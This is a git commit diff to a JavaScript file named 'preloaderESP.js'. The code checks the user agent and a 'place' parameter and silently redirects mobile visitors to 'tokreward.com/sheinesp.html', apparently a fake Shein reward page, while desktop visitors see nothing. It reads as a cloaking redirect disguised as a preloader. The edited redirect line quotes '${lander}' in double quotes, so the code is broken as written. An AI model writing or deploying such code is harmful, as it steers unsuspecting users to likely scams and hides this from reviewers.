a7c82bddd25ac5a53f3c80aea610e7aa47abb6df
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-07-20 08:35:54 -0400

    Update preloaderESP.js

--- public/cdn/preloaderESP.js
+++ public/cdn/preloaderESP.js
@@ -1,7 +1,7 @@
 const utm = new URLSearchParams(window.location.search);
 const place = utm.get("place");
-const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 const lander = `https://tokreward.com/sheinesp.html?slug=${document.location.hostname.split('.')[0]}`;
 if (place === "__PLACEMENT__") { } 
-else if (isMobileDevice) { window.location.href = "${destinationLander}"; } 
+else if (isMobileDevice) { window.location.href = "${lander}"; } 
 else { }
